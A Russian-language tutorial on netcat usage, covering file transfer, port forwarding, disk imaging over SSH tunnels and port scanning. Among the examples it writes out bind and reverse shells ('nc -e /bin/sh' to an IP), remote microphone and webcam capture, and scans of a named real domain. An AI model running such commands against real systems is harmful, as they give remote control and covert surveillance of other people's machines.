# netcat - примеры использования
Утилита netcat позволяет передавать/принимать данные через TCP/UDP соединения.

Шаблон вызова утилиты

    nc host port

Откроем прием (ключ -l) данных на порте 1234 с подробным выводом информации (ключ -v) и продолжением работы после разрыва соединения (ключ -k), по-умолчанию nc разрывает соединение после первого дисконекта.

    nc -lvk 1234

Подключаемся к открытому порту и отправим import antigravity ;)

    nc 127.0.0.1 1234
    import antigravity

Пример более полезного использования nc - передача файла. На принимающей стороне

    nc -l 1234 > file

На отправляющей стороне

    nc localhost 1234 < file

Или можно отдавать файл любому подключившемуся. На передающей стороне

    nc -l 1234 < file

На принимающей стороне

    nc localhost 1234 > file

Пример открытия shell'а на определенном порте (источник). На стороне, где нужно открыть шел

    mkfifo /tmp/pipe;
    sh /tmp/pipe | nc -l 1234 > /tmp/pipe 

Еще один полезный пример с netcat - запуск процесса, с возможностью отслеживания его работы через сеть

    watch w | nc localhost 1234

Удаленно читать логи (первая - сервер, вторая - клиент):

    $ nc -f /var/log/messages | nc -l 31334
    $ nc 172.16.69.143 31334

Использовать вместо telnet (первая - telnet-сервер, вторая - клиент):

    $ nc -l -p 31334 -e /bin/sh
    $ nc 172.16.69.143 31334

Сканировать на открытые порты:

    $ nc -z execbit.ru 1-1024

Осуществлять фингерпринт сервисов на основе баннеров:

    $ echo "QUIT" | nc execbit.ru 1-1024

Организовывать обратный шелл (первая - клиент, вторая - сервер, однако шелл откроется от сервера к клиенту):

    $ nc -e /bin/sh 172.16.69.143 31334
    $ nc -l -p 31334

Делать микрофонную запись с удаленной машины (сервер, клиент):

    $ arecord -f dat -t raw | nc -l 31337
    $ nc 172.16.69.143 31337 | oggenc - -r -o nc.ogg

Получать снимки с web-камеры удаленной машины (сервер, клиент):

    $ while [ 1 ]; do streamer -o /tmp/photo.jpeg; nc -l 31337 < /tmp/photo.jpeg; done
    $ nc localhost 31337 > photo.jpeg

Однако, важно понимать, что существует несколько версий netcat, поведение которых может отличаться. Экземпляр, поставляемый с дистрибутивами Linux, - это оригинал, доживший до наших дней. Все приведенные примеры он отработает без проблем. Версия под названием GNU Netcat не поддерживает опции -e, netcat, распространяемый вместе с BSD-системами, опция -e в нем есть, но предназначена она для шифрования входящего и исходящего трафика методом IPSec ESP:

    $ nc -e 'in ipsec esp/transport//require' -e 'out ipsec esp/transport//require' 172.16.69.143 31334

Кроме того, BSD Netcat способен подключаться к удаленной машине через прокси:

    $ nc -x172.16.64.1:8080 -Xconnect 172.16.69.143 31334

В этом примере прокси находится по адресу 172.16.64.1:8080, а флаг -Xconnect говорит о том, что он работает с протоколом HTTP. Также поддерживаются SOCKS версий 4 и 5, но о них следует информировать netcat через флаг -X4 или -X5.

Сам netcat легко использовать в качестве прокси или редиректора портов, но в этом случае его лучше связать с демоном inetd:

    # echo 'redirect-2525-to-25 2525/tcp' >> /etc/services
    # echo 'redirect-2525-to-25 stream tcp nowait nobody /usr/bin/nc nc -w 2 127.0.0.1 25' >> /etc/inetd.conf
    # killall -HUP inetd

Теперь весь трафик, пришедший на порт 2525, будет перенаправляться на стандартный 25-й SMTP-порт. Таким же образом мы можем завернуть трафик с любого порта на другой порт/машину, просто видоизменив первые две команды.

Кстати, пользователи дистрибутивов Linux могут вообще не заморачиваться с netcat: демон xinetd, ставший стандартом в Linux-системах, сам умеет перенаправлять сетевой трафик:

    $ cat /etc/xinetd/redirect
    service redirect-2525-to-25
    {
        disable = no
        type = UNLISTED
        socket_type = stream
        protocol = tcp
        wait = no
        port = 2525
        redirect = 127.0.0.1 25
        user = nobody
    }

Утилита netcat может также пригодиться для создания образа раздела жесткого диска с возможностью отправки его на удаленный сервер на лету:

    $ dd if=/dev/hdb5 | gzip -9 | nc -l 3333

А на удаленной машине принять созданный образ можно так:

    $ nc 192.168.0.1 3333 | pv -b > myhdb5partition.img.gz

В случае необходимости отправки группы файлов – например, набора конфигурационных файлов – можно скомбинировать netcat и архиватор tar:

    $ tar -czf - /etc/ | nc -l 3333

Дефис в качестве имени файла в параметрах tar необходим для того, чтобы вывести результат работы архиватора на stdin, который затем перенаправляется в netcat. Принять созданный бэкап на удаленной машине можно аналогично изложенному ранее:

    $ nc 192.168.0.1 3333 | pv -b > mybackup.tar.gz

Очевидно, что при подобном использовании netcat информация передается по сети в исходном нешифрованном виде. Для передачи некритических данных это вполне приемлемо, но при передаче какой-либо ценной информации разумно использовать netcat в сочетании с SSH-туннелем.

Использование SSH-туннеля имеет два преимущества:

* Информация передается внутри зашифрованного туннеля, так что она хорошо защищена;
* На сервере не требуется открывать никаких дополнительных портов в конфигурации файрвола, поскольку соединение будет установлено через SSH

На стороне сервера файл в netcat выставляется точно так же, как описано ранее:

    $ cat backup.iso | nc -l 3333

А вот на стороне клиента подключаемся к ожидающему соединений сокету netcat через SSH-туннель:

    $ ssh -f -L 23333:127.0.0.1:3333 me@192.168.0.1 sleep 10; \
    nc 127.0.0.1 23333 | pv -b > backup.iso

Понятно, что есть и другие способы помещения соединения в SSH-туннель, но создание и использование туннеля именно таким образом имеет полезную особенность, что туннель автомагически закрывается при окончании передачи данных через netcat.

Невероятно, но netcat еще можно использовать и для сканирования открытых портов. Для этого поможет параметр -z:

    $ nc -z 192.168.0.1 80-90
    Connection to 192.168.0.1 80 port [tcp/http] succeeded!

В данном примере netcat сканировал диапазон портов 80-90 и сообщил, что на удаленной машине открыт порт 80.
